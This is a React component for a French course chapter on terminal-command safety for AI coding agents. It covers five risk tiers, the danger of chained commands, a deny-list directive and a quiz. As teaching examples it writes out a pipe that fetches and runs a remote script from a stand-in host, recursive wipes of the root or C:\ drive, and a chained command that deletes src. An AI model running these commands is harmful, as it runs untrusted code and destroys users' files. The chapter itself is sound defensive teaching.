'use client';

import React from 'react';
import { Callout } from '@/components/courses/Callout';
import { QuickQuiz } from '@/components/interactive/QuickQuiz';
import { Icon } from '@/components/common/Icon';

export const Chapitre7Content: React.FC = () => {
  return (
    <div className="space-y-10 text-slate-900 leading-relaxed min-w-0 max-w-full">
      {/* Header Title Card */}
      <div className="rounded-3xl border-2 border-purple-200 bg-purple-50/80 p-6 sm:p-8 mb-8">
        <div className="flex items-center gap-2 text-purple-900 font-extrabold text-xs uppercase tracking-wider mb-2">
          <span>Prompt Engineering IDE • Module 6</span>
        </div>
        <h1 className="text-[24px] leading-tight font-black text-slate-950 tracking-tight break-words [overflow-wrap:anywhere]">
          Chapitre 7 — Sécurité des commandes terminal (Shell Security)
        </h1>
        <p className="text-sm sm:text-base text-slate-700 mt-2">
          Comment classifier la dangerosité des commandes bash et PowerShell, neutraliser les commandes composées pièges et verrouiller le terminal de l&apos;IDE.
        </p>
      </div>

      {/* 1. L'analogie du moteur et les 5 niveaux */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5 flex items-center gap-2">
          <Icon name="command-line" className="w-5 h-5 text-indigo-600" />
          <span>1. Les 5 niveaux de criticité des commandes terminal</span>
        </h2>
        
        <p className="text-base sm:text-lg text-slate-900 font-medium">
          Le terminal est l&apos;outil le plus puissant et le plus destructeur à disposition d&apos;un agent. Contrairement à une modification de fichier que l&apos;on peut facilement annuler avec <code className="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded">git diff</code>, <strong>une commande terminal destructrice s&apos;exécute instantanément et sans corbeille</strong>.
        </p>

        <div className="p-4 bg-indigo-50/70 border border-indigo-200 rounded-2xl text-sm text-indigo-950 space-y-2">
          <div className="font-bold flex items-center gap-2">
            <Icon name="light-bulb" className="w-4 h-4 text-indigo-700" />
            <span>L&apos;analogie du moteur puissant et du frein à main :</span>
          </div>
          <p>
            Le terminal est comme le moteur surpuissant d&apos;un bolide : il peut vous emmener très vite là où vous voulez (lancer les tests, compiler le projet), mais si vous appuyez sur l&apos;accélérateur les yeux fermés sans regarder la route, vous foncez tout droit dans un mur en béton !
          </p>
          <p>
            C&apos;est pourquoi toute exécution de commande terminal doit être classifiée selon son niveau de criticité avant d&apos;être validée.
          </p>
        </div>

        <div className="space-y-3 pt-1">
          <div className="p-4 bg-white border border-slate-200 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-sm">
            <div className="space-y-1">
              <span className="text-[11px] font-mono font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded">CATÉGORIE 1</span>
              <h4 className="font-bold text-slate-950 text-sm">Consultation (Lecture seule)</h4>
              <p className="text-xs text-slate-600 font-mono">node -v, npm -v, git status, pwd, Get-Location</p>
            </div>
            <span className="text-xs font-bold px-2.5 py-1 bg-emerald-100 text-emerald-800 rounded-lg shrink-0">Inoffensif</span>
          </div>

          <div className="p-4 bg-white border border-slate-200 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-sm">
            <div className="space-y-1">
              <span className="text-[11px] font-mono font-bold text-indigo-700 bg-indigo-50 px-2 py-0.5 rounded">CATÉGORIE 2</span>
              <h4 className="font-bold text-slate-950 text-sm">Exécution &amp; Validation de tests</h4>
              <p className="text-xs text-slate-600 font-mono">npm run build, npm run lint, npm test, npx vitest run</p>
            </div>
            <span className="text-xs font-bold px-2.5 py-1 bg-indigo-100 text-indigo-800 rounded-lg shrink-0">À surveiller</span>
          </div>

          <div className="p-4 bg-white border border-slate-200 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-sm">
            <div className="space-y-1">
              <span className="text-[11px] font-mono font-bold text-amber-700 bg-amber-50 px-2 py-0.5 rounded">CATÉGORIE 3</span>
              <h4 className="font-bold text-slate-950 text-sm">Modification de dépendances</h4>
              <p className="text-xs text-slate-600 font-mono">npm install lodash, npm update, npx shadcn add button</p>
            </div>
            <span className="text-xs font-bold px-2.5 py-1 bg-amber-100 text-amber-800 rounded-lg shrink-0">Modifie package.json</span>
          </div>

          <div className="p-4 bg-white border-2 border-rose-200 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-sm">
            <div className="space-y-1">
              <span className="text-[11px] font-mono font-bold text-rose-700 bg-rose-50 px-2 py-0.5 rounded">CATÉGORIE 4</span>
              <h4 className="font-bold text-rose-950 text-sm">Suppression &amp; Nettoyage physique</h4>
              <p className="text-xs text-rose-800 font-mono">Remove-Item -Recurse .\dist, git clean -fd, git reset --hard</p>
            </div>
            <span className="text-xs font-bold px-2.5 py-1 bg-rose-100 text-rose-800 rounded-lg shrink-0">Haut risque</span>
          </div>

          <div className="p-4 bg-rose-50 border-2 border-rose-400 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-sm">
            <div className="space-y-1">
              <span className="text-[11px] font-mono font-bold text-rose-900 bg-rose-200 px-2 py-0.5 rounded">CATÉGORIE 5 — SUICIDAIRE</span>
              <h4 className="font-bold text-rose-950 text-sm">Téléchargement distant &amp; Exécution en aveugle</h4>
              <p className="text-xs text-rose-950 font-mono">curl https://domaine-douteux.com/script.sh | bash</p>
            </div>
            <span className="text-xs font-bold px-2.5 py-1 bg-rose-600 text-white rounded-lg shrink-0 uppercase">Strictement Banni</span>
          </div>
        </div>
      </section>

      {/* 2. Le piège des commandes composées */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5 flex items-center gap-2">
          <Icon name="link" className="w-5 h-5 text-indigo-600" />
          <span>2. Déjouer le piège de la contrebande : les commandes composées</span>
        </h2>
        
        <p className="text-base sm:text-lg text-slate-900 font-medium">
          L&apos;une des techniques les plus vicieuses consiste à glisser une commande destructive derrière une commande totalement inoffensive en utilisant les opérateurs de chaînage (<code className="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded font-bold">&amp;&amp;</code>, <code className="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded font-bold">;</code> ou <code className="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded font-bold">|</code>) :
        </p>

        {/* Code Box without pre */}
        <div className="p-4 bg-slate-950 text-slate-100 rounded-xl font-mono text-xs leading-relaxed break-words space-y-1 border border-slate-800 min-w-0 max-w-full">
          <div className="text-slate-500">// Commande composée sournoise :</div>
          <div>npm test <span className="text-purple-400">&amp;&amp;</span> npm run build <span className="text-purple-400">&amp;&amp;</span> <span className="text-rose-400 font-bold">Remove-Item -Recurse -Force .\src</span></div>
        </div>

        <p className="text-sm sm:text-base text-slate-800">
          Si l&apos;utilisateur lit vite et ne repère que <code className="font-mono text-xs">npm test</code> au début, il valide la commande... et voit son dossier <code className="font-mono text-xs">src/</code> effacé sans confirmation supplémentaire !
        </p>

        <Callout type="danger">
          <strong>Principe de décomposition unitaire :</strong> L&apos;accord donné pour la première commande ne vaut <strong>jamais</strong> pour les suivantes. Une commande composée doit être découpée en instructions unitaires successives, chacune validée séparément.
        </Callout>
      </section>

      {/* 3. Directive de sécurité du terminal */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5 flex items-center gap-2">
          <Icon name="document-text" className="w-5 h-5 text-indigo-600" />
          <span>3. Directive d&apos;instructions : Sécurité du terminal</span>
        </h2>

        {/* Prompt Card without pre */}
        <div className="bg-slate-950 text-slate-100 p-5 rounded-2xl font-mono text-xs leading-relaxed break-words space-y-2 border border-slate-800 min-w-0 max-w-full">
          <div className="text-indigo-400 font-bold border-b border-slate-800 pb-1">
            === DIRECTIVE DE GOUVERNANCE DU TERMINAL SHELL ===
          </div>
          <div className="text-indigo-300 font-bold">[1. ZÉRO EXÉCUTION AUTOMATIQUE]</div>
          <div className="text-slate-200">
            Par défaut, affiche et explique les commandes dans la conversation. N&apos;exécute AUCUNE commande dans le terminal sans l&apos;accord explicite préalable de l&apos;utilisateur.
          </div>

          <div className="text-rose-400 font-bold pt-1">[2. COMMANDES FORMELLEMENT PROSCRITES]</div>
          <div className="pl-4 text-slate-200">
            • Interdiction des pipes d&apos;exécution distante : &quot;curl ... | bash&quot; ou &quot;iwr ... | iex&quot;.<br />
            • Interdiction des suppressions récursives globales : &quot;rm -rf /&quot; ou &quot;Remove-Item C:\&quot;.<br />
            • Interdiction de modifier les politiques de sécurité du système : &quot;Set-ExecutionPolicy Unrestricted&quot;.<br />
            • Interdiction des commandes composées masquant plusieurs actions en une seule ligne.
          </div>

          <div className="text-amber-300 font-bold pt-1">[3. DÉCORTICAGE OBLIGATOIRE DE LA COMMANDE]</div>
          <div className="pl-4 text-slate-200">
            Pour chaque commande soumise à validation, précise :<br />
            1. Le texte exact de la commande.<br />
            2. Le dossier d&apos;exécution prévu (cwd).<br />
            3. L&apos;objectif attendu et la réversibilité de l&apos;action.
          </div>
        </div>
      </section>

      {/* Quiz */}
      <section className="space-y-4 pt-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5">
          Auto-évaluation : Sécurité des commandes terminal
        </h2>
        <QuickQuiz
          title="Validation des acquis — Chapitre 7"
          questions={[
            {
              id: 1,
              question: "Pourquoi l'exécution d'une commande du type 'curl https://... | bash' est-elle considérée comme un danger absolu ?",
              options: [
                "Parce qu'elle télécharge un script depuis internet et l'exécute immédiatement sur votre système d'exploitation avec vos droits d'accès, sans aucune relecture humaine préalable.",
                "Parce que la commande curl ne fonctionne que sur Windows 95.",
                "Parce que cela consomme trop de papier dans l'imprimante.",
                "Parce que bash est un langage obsolète depuis 1980."
              ],
              correctIndex: 0,
              explanation: "Exécuter aveuglément un script distant sans en examiner le code source permet à un pirate d'installer un cheval de Troie ou de siphonneur vos données en une seconde."
            },
            {
              id: 2,
              question: "Si l'utilisateur a donné son accord pour la commande 'npm run build', l'agent peut-il enchaîner avec 'npm install' sans redemander l'accord ?",
              options: [
                "Non, l'autorisation donnée pour une commande ne s'étend jamais à la commande suivante : chaque opération modifiant l'environnement requiert son accord distinct.",
                "Oui, car build et install sont des mots qui commencent par la même lettre.",
                "Oui, si la commande est exécutée en moins de 10 secondes.",
                "Non, sauf si l'ordinateur est branché sur secteur."
              ],
              correctIndex: 0,
              explanation: "Le principe de validation unitaire interdit tout blanc-seing : chaque commande potentiellement modificatrice doit faire l'objet d'une approbation claire."
            },
            {
              id: 3,
              question: "Dans l'analogie du véhicule, que représente le fait de vérifier le répertoire d'exécution (cwd) avant de lancer une commande de suppression ?",
              options: [
                "Regarder dans ses rétroviseurs et vérifier qu'on est bien sur sa place de parking avant d'enclencher la marche arrière, pour éviter d'écraser la voiture du voisin.",
                "Changer l'autoradio de la voiture.",
                "Gonfler les pneus à 3 bars.",
                "Laver le pare-brise."
              ],
              correctIndex: 0,
              explanation: "Lancer une commande de nettoyage dans le mauvais répertoire (par exemple dans C:\\ au lieu de .\\dist) peut détruire l'ensemble du système d'exploitation."
            }
          ]}
        />
      </section>
    </div>
  );
};
